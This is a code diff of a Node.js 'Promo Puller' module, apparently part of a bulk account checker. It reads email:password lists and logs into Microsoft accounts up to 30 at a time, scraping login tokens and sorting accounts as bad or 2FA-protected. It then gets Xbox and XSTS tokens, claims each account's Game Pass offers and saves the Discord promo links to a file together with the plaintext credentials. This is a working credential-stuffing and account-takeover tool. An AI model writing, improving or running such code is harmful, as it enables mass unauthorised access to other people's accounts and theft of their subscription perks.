@@ -1,38 +1,28 @@
 // ============================================================
-//  Promo Puller — 1:1 Node.js port of main.py
-//  Isolated module. Does NOT use the global proxy pool.
-//  Direct connections only (the source script has no proxies).
-//  Do not modify internal logic.
+//  Promo Puller — pulls Discord promo codes from Xbox Game Pass
+//  Strict 1:1 port of the upstream auth + offers pipeline.
+//  Pipeline: dynamic PPFT → Microsoft login → Xbox auth →
+//            XSTS (xboxlive.com) → profile.gamepass.com/v2/offers
+//            → POST per available offer → filter "discord".
+//  Direct connections only. Output: per-account promo URLs.
 // ============================================================
 
 const fs = require("fs");
 const path = require("path");
-const config = require("../config");
 const { logger } = require("./logger");
 
 const log = logger.child("promopuller");
 
-// ── Hardcoded values ported verbatim from main.py ────────────
-const TOKEN_URL =
-  "https://login.live.com/ppsecure/post.srf?client_id=00000000402B5328&contextid=BDC5114DCDD66170&opid=24F67D97F397B4D4&bk=1766143321&uaid=b63537c0c7504c9994c9bb225f8b15b1&pid=15216&prompt=none";
-
-const PPFT =
-  "-DtA1pAkl0XJHNRkli!yvhp27QUgO13pUa3ZWnDBoHwyy!k9wWNwRWEyQYe!VK9zJcqrm8WWg7JoT30qyiKuxfftM*Nu6dE*e2km5kZLsSJhMmVmWWPE1KERSnnEcSLmF7fINHZ8RCZiQuA7svzQrpZ!cT0EXEdgCMzKKtGxHdEr2ASIuVp18K!PVtqs!!VJ2BHaCCoZmkDbbdM93QVJFUEqlZs5Irk1FrfHBmkOwc!oljXDF7s4yd0QLH6F8!OApew$$";
-
-const STATIC_COOKIE =
-  "MSPRequ=id=N&lt=1766143321&co=0; uaid=b63537c0c7504c9994c9bb225f8b15b1; OParams=11O.Dmr1Vzmgxhnw*DZMBommGzglE!XAx**dZAAEAkqrj6Vhfs1*d8zayvuFT4v8h**f4Zznq9nRUcLS9f73g52XDgo7Kbzaj6iKcOC5jd*0H*P0vHhUeQjflLTYuHZ5HjCH91cYf2IwyylYf1h*C0T0EAXHejOrafOi5c0OR9bDhZmwlD0LAij0Nh!LTG99GmPovt95zHocHGurn3MldqO7Wiu5sxHh72H0Lyq7fpM6jzizp7AunI36mEHFzldPpwHIiRIKpTu*ZLNOMdGWqc0eSTB8YMzPtg8dceV4x5n9Tg2EUB2Ys3Dy2Y0BTAddNnvHH4XHvg!FnkKhATiMub2jf8aakcAvExkfKMMWQuvAsS8shz0nD*eOvpilbh273y!r43VDwk5BEaKKmnZwjWFnKpWfx2wi1x3vfEtiU!EVKaGG; MSPOK=$uuid-643bb80a-c886-4f04-af49-4ab7b44ddc78$uuid-ee3b24c9-f289-4f10-aff1-7ff79eb97c11";
-
-const DISCORD_TOKEN = config.DISCORD_TOKEN || "YOUR_DISCORD_TOKEN_HERE";
-
-const MAX_THREADS = 100;
-const STEP_RETRIES_LIMIT = 5;
-const OUTER_RETRIES_LIMIT = 5;
-const REQ_TIMEOUT_MS = 10000;
+// ── Tunables ────────────────────────────────────────────────
+const MAX_THREADS = 30;
+const STEP_RETRIES = 5;
+const OUTER_RETRIES = 5;
+const REQ_TIMEOUT_MS = 15000;
 
 const PROMOS_FILE = path.join(__dirname, "..", "..", "promos.txt");
-const SAVE_LOCK = { busy: false, queue: [] };
 
-// Mutex for promos.txt + counters (mirrors save_lock in python)
+// Mutex for promos.txt (serialise writes across workers)
+const SAVE_LOCK = { busy: false, queue: [] };
 async function withSaveLock(fn) {
   if (SAVE_LOCK.busy) {
     await new Promise((res) => SAVE_LOCK.queue.push(res));
@@ -47,7 +37,45 @@ async function withSaveLock(fn) {
   }
 }
 
-// ── Timeout fetch ────────────────────────────────────────────
+// ── Auth landing URL (same as the AIO checker's sFTTag_url) ─
+const SFT_URL =
+  "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";
+
+// Regexes mirror the upstream Python module
+const RE_SFTTAG_VALUE = /value=\\"(.+?)\\"|value="(.+?)"|sFTTag:'(.+?)'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"/s;
+const RE_URLPOST_VALUE = /"urlPost":"(.+?)"|urlPost:'(.+?)'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"/s;
+const RE_IPT = /(?<="ipt" value=").+?(?=">)/;
+const RE_PPRID = /(?<="pprid" value=").+?(?=">)/;
+const RE_UAID = /(?<="uaid" value=").+?(?=">)/;
+const RE_ACTION_FMHF = /(?<=id="fmHF" action=").+?(?=" )/;
+const RE_RETURN_URL = /(?<="recoveryCancel":\{"returnUrl":").+?(?=",)/;
+
+// ── Cookie jar ───────────────────────────────────────────────
+class CookieJar {
+  constructor() { this.cookies = new Map(); }
+  ingestSetCookie(headers) {
+    const sc = headers.getSetCookie ? headers.getSetCookie() : null;
+    if (sc && sc.length) {
+      for (const c of sc) this._parse(c);
+      return;
+    }
+    const raw = headers.get("set-cookie");
+    if (!raw) return;
+    const parts = raw.split(/,(?=\s*[^;,]+=[^;,]+)/);
+    for (const c of parts) this._parse(c);
+  }
+  _parse(str) {
+    const head = String(str).split(";")[0].trim();
+    const eq = head.indexOf("=");
+    if (eq <= 0) return;
+    this.cookies.set(head.slice(0, eq).trim(), head.slice(eq + 1).trim());
+  }
+  toString() {
+    return [...this.cookies.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
+  }
+}
+
+// ── Timeout-aware fetch ──────────────────────────────────────
 async function timedFetch(url, opts = {}, ms = REQ_TIMEOUT_MS) {
   const ctrl = new AbortController();
   const userSignal = opts.signal;
@@ -55,248 +83,280 @@ async function timedFetch(url, opts = {}, ms = REQ_TIMEOUT_MS) {
     if (userSignal.aborted) ctrl.abort();
     else userSignal.addEventListener("abort", () => ctrl.abort(), { once: true });
   }
-  const timer = setTimeout(() => {
-    try { ctrl.abort(); } catch {}
-  }, ms);
+  const timer = setTimeout(() => { try { ctrl.abort(); } catch {} }, ms);
   try {
-    return await fetch(url, { ...opts, redirect: "manual", signal: ctrl.signal });
+    return await fetch(url, { ...opts, signal: ctrl.signal });
   } finally {
     clearTimeout(timer);
   }
 }
 
-// ── Promo validation via Discord API (check_promo) ───────────
-async function checkPromo(promoLink) {
-  try {
-    if (!DISCORD_TOKEN || DISCORD_TOKEN === "YOUR_DISCORD_TOKEN_HERE") {
-      return { data: null, error: "No Token Provided" };
+// ── Manual-redirect fetch with cookie jar ────────────────────
+async function jarFetch(url, options, jar, signal) {
+  let current = url;
+  let opts = { ...options, redirect: "manual" };
+  let hops = 0;
+  while (hops++ < 12) {
+    const headers = { ...(opts.headers || {}), Cookie: jar.toString() };
+    const res = await timedFetch(current, { ...opts, headers, signal }, REQ_TIMEOUT_MS);
+    jar.ingestSetCookie(res.headers);
+    if (res.status >= 300 && res.status < 400) {
+      const loc = res.headers.get("location");
+      if (!loc) return res;
+      let next = loc;
+      if (loc.startsWith("/")) next = new URL(current).origin + loc;
+      else if (!/^https?:/i.test(loc)) next = new URL(current).origin + "/" + loc;
+      current = next;
+      opts = { ...opts, method: "GET", body: undefined };
+      continue;
     }
-    const code = promoLink.split("/").pop();
-    const r = await timedFetch(
-      `https://discord.com/api/v9/entitlements/gift-codes/${code}?with_application=false&with_subscription_plan=true`,
-      { method: "GET", headers: { Authorization: DISCORD_TOKEN } },
-    );
-    if (r.status === 200) {
-      const data = await r.json();
-      if (data.uses >= data.max_uses) return { data: null, error: "Max Uses Reached" };
-      if (data.redeemed) return { data: null, error: "Already Redeemed" };
-      return {
-        data: { uses: data.uses, max_uses: data.max_uses, expires_at: data.expires_at },
-        error: null,
-      };
-    } else if (r.status === 404) {
-      return { data: null, error: "Invalid Code (404)" };
-    } else {
-      return { data: null, error: `Check Failed (${r.status})` };
-    }
-  } catch (e) {
-    return { data: null, error: `Error: ${e.message || e}` };
+    const text = await res.text();
+    return { status: res.status, url: current, text, headers: res.headers };
   }
+  return { status: 0, url: current, text: "", headers: new Headers() };
 }
 
-// ── Per-account check (1:1 port of `check`) ──────────────────
-async function checkAccount(email, password, signal, counters) {
-  let outerRetries = 0;
+function firstGroup(match) {
+  if (!match) return null;
+  for (let i = 1; i < match.length; i++) if (match[i]) return match[i];
+  return null;
+}
 
-  while (true) {
-    if (signal?.aborted) return { error: "aborted", links: [] };
-    if (outerRetries > OUTER_RETRIES_LIMIT) return { error: "retries_exhausted", links: [] };
-    outerRetries += 1;
-
+// ── Step 1: pull urlPost + sFTTag (PPFT) ─────────────────────
+async function getUrlPostSFTTag(jar, signal) {
+  for (let i = 0; i < STEP_RETRIES; i++) {
+    if (signal?.aborted) return { error: "aborted" };
     try {
-      // ── Step 1: token request ─────────────────────────────
-      let token = null;
-      let stepRetries = 0;
-      while (true) {
-        if (signal?.aborted) return { error: "aborted", links: [] };
-        if (stepRetries > STEP_RETRIES_LIMIT) return { error: "token_retries", links: [] };
-        stepRetries += 1;
+      const r = await jarFetch(SFT_URL, {
+        method: "GET",
+        headers: {
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.9",
+        },
+      }, jar, signal);
+      const sFTTag = firstGroup(RE_SFTTAG_VALUE.exec(r.text));
+      const urlPost = firstGroup(RE_URLPOST_VALUE.exec(r.text));
+      if (sFTTag && urlPost) return { urlPost: urlPost.replace(/&amp;/g, "&"), sFTTag };
+    } catch {}
+  }
+  return { error: "no_ppft" };
+}
+
+// ── Step 2: post credentials, harvest RPS access_token ───────
+async function getXboxRps(jar, email, password, urlPost, sFTTag, signal) {
+  for (let i = 0; i < STEP_RETRIES; i++) {
+    if (signal?.aborted) return "ABORT";
+    try {
+      const body = new URLSearchParams({
+        login: email,
+        loginfmt: email,
+        passwd: password,
+        PPFT: sFTTag,
+      }).toString();
+      const r = await jarFetch(urlPost, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.9",
+        },
+        body,
+      }, jar, signal);
+
+      // Token in fragment
+      if (r.url.includes("#") && r.url !== SFT_URL) {
         try {
-          const body = new URLSearchParams({
-            login: email,
-            loginfmt: email,
-            passwd: password,
-            PPFT: PPFT,
-          }).toString();
-          const tokenReq = await timedFetch(TOKEN_URL, {
+          const frag = new URL(r.url).hash.slice(1);
+          const tok = new URLSearchParams(frag).get("access_token");
+          if (tok) return tok;
+        } catch {}
+      }
+
+      // Cancel-form path → resubmit hidden inputs
+      if (r.text.includes("cancel?mkt=")) {
+        const ipt = (r.text.match(RE_IPT) || [])[0];
+        const pprid = (r.text.match(RE_PPRID) || [])[0];
+        const uaid = (r.text.match(RE_UAID) || [])[0];
+        const action = (r.text.match(RE_ACTION_FMHF) || [])[0];
+        if (ipt && pprid && uaid && action) {
+          const body2 = new URLSearchParams({ ipt, pprid, uaid }).toString();
+          const ret = await jarFetch(action, {
             method: "POST",
-            headers: {
-              "content-type": "application/x-www-form-urlencoded",
-              cookie: STATIC_COOKIE,
-            },
-            body,
-            signal,
-          });
-          if (tokenReq.status === 429) continue;
-          if (tokenReq.status !== 302) return { error: `token_status_${tokenReq.status}`, links: [] };
-          const loc = tokenReq.headers.get("location") || "";
-          if (loc.includes("token=")) {
-            token = loc.split("token=")[1].split("&")[0];
-          } else {
-            return { error: "no_token_in_location", links: [] };
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: body2,
+          }, jar, signal);
+          const back = (ret.text.match(RE_RETURN_URL) || [])[0];
+          if (back) {
+            const fin = await jarFetch(back, { method: "GET" }, jar, signal);
+            try {
+              const frag = new URL(fin.url).hash.slice(1);
+              const tok = new URLSearchParams(frag).get("access_token");
+              if (tok) return tok;
+            } catch {}
           }
-          break;
-        } catch (_) {
-          continue;
         }
       }
 
-      if (!token || token === "None") break;
+      const lower = r.text.toLowerCase();
+      if (
+        lower.includes("recover?mkt") ||
+        lower.includes("account.live.com/identity/confirm?mkt") ||
+        lower.includes("email/confirm?mkt") ||
+        lower.includes("/abuse?mkt=")
+      ) return "2FA";
+      if (
+        lower.includes("password is incorrect") ||
+        lower.includes("account doesn't exist") ||
+        lower.includes("sign in to your microsoft account") ||
+        lower.includes("tried to sign in too many times") ||
+        lower.includes("help us protect your account")
+      ) return "BAD";
+    } catch {}
+  }
+  return "ERROR";
+}
 
-      // ── Step 2: Xbox user authenticate ────────────────────
-      let xboxToken = null, uhs = null;
-      stepRetries = 0;
-      while (true) {
-        if (signal?.aborted) return { error: "aborted", links: [] };
-        if (stepRetries > STEP_RETRIES_LIMIT) return { error: "xbox_retries", links: [] };
-        stepRetries += 1;
-        try {
-          const xbl = await timedFetch("https://user.auth.xboxlive.com/user/authenticate", {
-            method: "POST",
-            headers: { "content-type": "application/json", accept: "application/json" },
-            body: JSON.stringify({
-              Properties: {
-                AuthMethod: "RPS",
-                SiteName: "user.auth.xboxlive.com",
-                RpsTicket: token,
-              },
-              RelyingParty: "http://auth.xboxlive.com",
-              TokenType: "JWT",
-            }),
-            signal,
-          });
-          if (xbl.status === 429) continue;
-          const js = await xbl.json().catch(() => ({}));
-          xboxToken = js.Token;
-          if (xboxToken) {
-            uhs = js?.DisplayClaims?.xui?.[0]?.uhs;
-            break;
-          } else {
-            return { error: "no_xbox_token", links: [] };
-          }
-        } catch (_) {
-          continue;
+// ── Step 3: Xbox user authenticate ───────────────────────────
+async function xboxAuth(rps, signal) {
+  for (let i = 0; i < STEP_RETRIES; i++) {
+    if (signal?.aborted) return null;
+    try {
+      const r = await timedFetch("https://user.auth.xboxlive.com/user/authenticate", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", Accept: "application/json" },
+        body: JSON.stringify({
+          Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: rps },
+          RelyingParty: "http://auth.xboxlive.com",
+          TokenType: "JWT",
+        }),
+        signal,
+      });
+      if (r.status === 429) continue;
+      const j = await r.json().catch(() => ({}));
+      const xboxToken = j.Token;
+      const uhs = j?.DisplayClaims?.xui?.[0]?.uhs;
+      if (xboxToken && uhs) return { xboxToken, uhs };
+      return null;
+    } catch {}
+  }
+  return null;
+}
+
+// ── Step 4: XSTS authorize against xboxlive.com (Game Pass) ──
+async function xstsGamePass(xboxToken, uhs, signal) {
+  for (let i = 0; i < STEP_RETRIES; i++) {
+    if (signal?.aborted) return null;
+    try {
+      const r = await timedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", Accept: "application/json" },
+        body: JSON.stringify({
+          Properties: { SandboxId: "RETAIL", UserTokens: [xboxToken] },
+          RelyingParty: "http://xboxlive.com",
+          TokenType: "JWT",
+        }),
+        signal,
+      });
+      if (r.status === 429) { await sleep(1000); continue; }
+      if (r.status === 401) return null;
+      if (r.status !== 200) return null;
+      const j = await r.json().catch(() => ({}));
+      if (j.Token) return `XBL3.0 x=${uhs};${j.Token}`;
+      return null;
+    } catch {}
+  }
+  return null;
+}
+
+// ── Step 5: list offers and pick Discord promos ──────────────
+async function fetchDiscordPromos(authHeader, signal) {
+  let offers = null;
+  for (let i = 0; i < STEP_RETRIES; i++) {
+    if (signal?.aborted) return [];
+    try {
+      const r = await timedFetch("https://profile.gamepass.com/v2/offers", {
+        method: "GET",
+        headers: { authorization: authHeader },
+        signal,
+      });
+      if (r.status === 429) { await sleep(1000); continue; }
+      if (r.status !== 200) return [];
+      const j = await r.json().catch(() => ({}));
+      offers = j.offers || [];
+      break;
+    } catch {}
+  }
+  if (!offers) return [];
+
+  const promos = [];
+  for (const offer of offers) {
+    if (signal?.aborted) break;
+    let promo = null;
+    const status = offer.offerStatus;
+    if (status === "available") {
+      try {
+        const r = await timedFetch(
+          `https://profile.gamepass.com/v2/offers/${offer.offerId}`,
+          { method: "POST", headers: { authorization: authHeader }, signal },
+        );
+        if (r.status === 200) {
+          const j = await r.json().catch(() => ({}));
+          promo = j.resource;
         }
-      }
+      } catch {}
+    } else if (status === "claimed") {
+      promo = offer.resource;
+    }
 
-      // ── Step 3: XSTS authorize ────────────────────────────
-      let authToken = null;
-      stepRetries = 0;
-      while (true) {
-        if (signal?.aborted) return { error: "aborted", links: [] };
-        if (stepRetries > STEP_RETRIES_LIMIT) return { error: "xsts_retries", links: [] };
-        stepRetries += 1;
-        try {
-          const xsts = await timedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
-            method: "POST",
-            headers: { "content-type": "application/json", accept: "application/json" },
-            body: JSON.stringify({
-              Properties: { SandboxId: "RETAIL", UserTokens: [xboxToken] },
-              RelyingParty: "http://xboxlive.com",
-              TokenType: "JWT",
-            }),
-            signal,
-          });
-          if (xsts.status === 429) continue;
-          if (xsts.status === 401) return { error: "xsts_401", links: [] };
-          const js = await xsts.json().catch(() => ({}));
-          const xstsToken = js.Token;
-          authToken = `XBL3.0 x=${uhs};${xstsToken}`;
-          break;
-        } catch (_) {
-          continue;
-        }
-      }
+    if (promo && String(promo).toLowerCase().includes("discord")) {
+      promos.push(String(promo));
+      // upstream Python breaks after first discord match
+      break;
+    }
+  }
+  return promos;
+}
 
-      // ── Step 4: profile.gamepass.com offers ───────────────
-      stepRetries = 0;
-      const links = [];
-      while (true) {
-        if (signal?.aborted) return { error: "aborted", links };
-        if (stepRetries > STEP_RETRIES_LIMIT) return { error: "offers_retries", links };
-        stepRetries += 1;
-        try {
-          const r = await timedFetch("https://profile.gamepass.com/v2/offers", {
-            method: "GET",
-            headers: { authorization: authToken },
-            signal,
-          });
-          if (r.status === 200) {
-            const j = await r.json().catch(() => ({}));
-            const offers = j.offers || [];
-            let promoFoundForAccount = false;
+// ── Per-account flow ─────────────────────────────────────────
+async function checkAccount(email, password, signal) {
+  let outer = 0;
+  while (outer++ < OUTER_RETRIES) {
+    if (signal?.aborted) return { error: "aborted", links: [] };
+    try {
+      const jar = new CookieJar();
 
-            for (const offer of offers) {
-              if (signal?.aborted) break;
-              let promo = null;
+      const sft = await getUrlPostSFTTag(jar, signal);
+      if (sft.error) return { error: sft.error, links: [] };
 
-              if (offer.offerStatus === "available") {
-                try {
-                  const pr = await timedFetch(
-                    `https://profile.gamepass.com/v2/offers/${offer.offerId}`,
-                    {
-                      method: "POST",
-                      headers: { authorization: authToken },
-                      signal,
-                    },
-                  );
-                  if (pr.status === 200) {
-                    const pj = await pr.json().catch(() => ({}));
-                    promo = pj.resource;
-                  }
-                } catch {}
-              } else if (offer.offerStatus === "claimed") {
-                promo = offer.resource;
-              }
+      const rps = await getXboxRps(jar, email, password, sft.urlPost, sft.sFTTag, signal);
+      if (rps === "2FA") return { error: "2fa", links: [] };
+      if (rps === "BAD") return { error: "bad_credentials", links: [] };
+      if (rps === "ABORT") return { error: "aborted", links: [] };
+      if (rps === "ERROR" || !rps) continue;
 
-              if (promo && String(promo).toLowerCase().includes("discord")) {
-                await withSaveLock(async () => {
-                  counters.promosFound += 1;
-                  const { data: promoData, error: errMsg } = await checkPromo(promo);
-                  if (promoData) {
-                    const formatted = `${promo} | uses: ${promoData.uses} | max uses: ${promoData.max_uses} | expires at: ${promoData.expires_at}`;
-                    log.info(`Found working promo: ${formatted}`);
-                    try {
-                      fs.appendFileSync(PROMOS_FILE, `${formatted}\n`);
-                    } catch (e) {
-                      log.warn(`promos.txt write failed: ${e.message}`);
-                    }
-                    links.push({ link: promo, status: "valid", info: promoData, formatted });
-                  } else {
-                    log.info(`Found promo (${errMsg}): ${promo}`);
-                    links.push({ link: promo, status: "invalid", error: errMsg });
-                  }
-                });
-                promoFoundForAccount = true;
-                break;
-              }
-            }
+      const xa = await xboxAuth(rps, signal);
+      if (!xa) return { error: "xbox_auth_failed", links: [] };
 
-            if (!promoFoundForAccount) return { error: null, links };
-          } else if (r.status === 401 || r.status === 403) {
-            return { error: `offers_${r.status}`, links };
-          } else {
-            continue;
-          }
-          break;
-        } catch (_) {
-          continue;
-        }
-      }
+      const auth = await xstsGamePass(xa.xboxToken, xa.uhs, signal);
+      if (!auth) return { error: "xsts_failed", links: [] };
 
-      return { error: null, links };
+      const promos = await fetchDiscordPromos(auth, signal);
+      return { error: null, links: promos };
     } catch (e) {
       const msg = String(e?.message || e || "");
       if (!/timeout|abort/i.test(msg)) {
-        log.warn(`Error: ${msg} ${email}:${password}`);
+        log.warn(`error ${email}: ${msg}`);
       }
-      continue;
     }
   }
-  return { error: null, links: [] };
+  return { error: "retries_exhausted", links: [] };
 }
 
-// ── Pool runner (mirrors ThreadPoolExecutor max_workers=100) ─
+// ── Pool runner ──────────────────────────────────────────────
 async function runPool(items, worker, concurrency, signal) {
   let i = 0;
   const results = new Array(items.length);
@@ -320,10 +380,10 @@ async function runPool(items, worker, concurrency, signal) {
   return results;
 }
 
-// ── Public API: same signature shape as microsoft-puller.pullLinks ─
+function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
+
+// ── Public API (unchanged signature) ─────────────────────────
 async function pullPromos(accounts, onProgress, signal) {
-  // Reset promos.txt at the start of each run (matches python "a" append behavior
-  // semantically but gives a clean per-run output for the user).
   try { fs.writeFileSync(PROMOS_FILE, ""); } catch {}
 
   const counters = { checked: 0, promosFound: 0 };
@@ -331,52 +391,54 @@ async function pullPromos(accounts, onProgress, signal) {
   const fetchResults = [];
   const allLinks = [];
 
-  log.info(`starting promo puller with ${total} accounts (no proxies, direct)`);
+  log.info(`starting promo puller: ${total} accounts`);
 
-  await runPool(
-    accounts,
-    async (acc) => {
-      const email = acc.email || acc[0];
-      const password = acc.password || acc[1];
-      const res = await checkAccount(email, password, signal, counters);
+  await runPool(accounts, async (acc) => {
+    const email = acc.email || acc[0];
+    const password = acc.password || acc[1];
+    const res = await checkAccount(email, password, signal);
 
-      counters.checked += 1;
+    counters.checked += 1;
+    const accountLinks = res.links || [];
 
-      const accountLinks = (res.links || []).map((l) =>
-        typeof l === "string" ? l : l.link,
-      );
-
-      fetchResults.push({
-        email,
-        password,
-        links: accountLinks,
-        error: res.error || null,
-        details: res.links || [],
-      });
-
-      for (const l of res.links || []) {
-        const link = typeof l === "string" ? l : l.link;
-        allLinks.push({ link, sourceEmail: email });
-      }
-
-      if (typeof onProgress === "function") {
+    if (accountLinks.length > 0) {
+      await withSaveLock(async () => {
+        counters.promosFound += accountLinks.length;
         try {
-          onProgress("fetch", {
-            done: counters.checked,
-            total,
-            email,
-            links: accountLinks.length,
-            error: res.error || null,
-          });
-        } catch {}
-      }
-    },
-    MAX_THREADS,
-    signal,
-  );
+          for (const promo of accountLinks) {
+            fs.appendFileSync(PROMOS_FILE, `${email}:${password} | ${promo}\n`);
+          }
+        } catch (e) {
+          log.warn(`promos.txt write failed: ${e.message}`);
+        }
+      });
+    }
 
-  log.info(`finished. checked=${counters.checked}/${total} promos_found=${counters.promosFound}`);
+    fetchResults.push({
+      email,
+      password,
+      links: accountLinks,
+      error: res.error || null,
+    });
 
+    for (const link of accountLinks) {
+      allLinks.push({ link, sourceEmail: email });
+    }
+
+    if (typeof onProgress === "function") {
+      try {
+        onProgress("fetch", {
+          done: counters.checked,
+          total,
+          email,
+          links: accountLinks.length,
+          error: res.error || null,
+        });
+      } catch {}
+    }
+  }, MAX_THREADS, signal);
+
+  log.info(`done. checked=${counters.checked}/${total} promos=${counters.promosFound}`);
   return { fetchResults, allLinks };
 }
 
